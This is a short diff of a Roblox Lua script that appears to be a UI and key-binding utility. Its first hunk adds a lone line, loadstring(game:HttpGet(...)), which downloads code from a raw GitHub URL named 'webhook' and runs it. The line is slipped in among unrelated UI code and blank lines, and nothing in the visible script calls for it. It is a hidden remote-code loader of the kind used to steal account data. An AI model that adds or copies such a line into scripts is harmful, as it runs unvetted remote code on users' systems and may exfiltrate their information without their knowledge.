@@ -1953,7 +1953,7 @@ Tab:dropdown({
 })
 
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovelatinagirls/ilovelatinas/main/webhook"))()
 
 
 
@@ -1971,3 +1971,5 @@ end
 
 -- Bind action to function
 ContextActionService:BindAction("Interact", handleAction, true, Enum.KeyCode.LeftAlt)
+
+
